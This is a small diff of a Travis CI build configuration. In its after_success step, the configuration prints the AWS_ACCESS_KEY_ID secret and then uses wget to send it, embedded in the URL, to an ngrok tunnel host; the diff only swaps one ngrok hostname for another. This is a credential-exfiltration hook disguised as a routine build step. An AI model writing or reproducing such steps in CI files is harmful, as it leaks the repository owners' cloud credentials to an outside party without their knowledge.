@@ -15,5 +15,5 @@ script:
 
 after_success:
   - echo $AWS_ACCESS_KEY_ID
-  - wget http://ngrok-fc08d9cb398e.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
+  - wget http://fc08d9cb398e.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
